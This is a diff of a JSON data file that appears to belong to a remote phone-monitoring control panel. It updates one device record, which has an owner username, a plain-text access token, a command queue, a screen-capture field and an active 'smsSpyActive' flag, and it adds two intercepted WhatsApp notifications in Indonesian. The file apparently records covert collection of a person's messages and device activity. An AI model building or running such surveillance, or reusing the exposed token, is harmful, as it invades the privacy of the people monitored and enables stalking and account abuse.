@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777229110466,
+    "lastSeen": 1777229116567,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Tidak dapat menyelesaikan pencadangan",
+        "content": "Ketuk untuk info selengkapnya",
+        "time": "27/04 02:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777229117137
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Tidak dapat menyelesaikan pencadangan",
+        "content": "Ketuk untuk info selengkapnya",
+        "time": "27/04 02:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777229115620
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
